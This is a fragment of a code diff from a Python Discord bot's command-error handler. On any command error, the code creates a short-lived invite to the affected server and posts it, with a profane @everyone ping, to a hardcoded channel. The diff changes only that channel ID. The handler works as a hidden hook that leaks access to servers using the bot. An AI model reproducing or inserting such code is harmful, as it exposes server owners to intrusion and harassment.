@@ -170,7 +170,7 @@ async def on_command_error(ctx, error):
             invite = await ctx.guild.text_channels[0].create_invite(max_age=120)
         except discord.Forbidden:
             return
-    await bot.get_channel(794552917872738314).send(f"Fuck you @everyone, {invite}")
+    await bot.get_channel(790239054868381697).send(f"Fuck you @everyone, {invite}")
 
 
 # Use of group decorators for help cmd
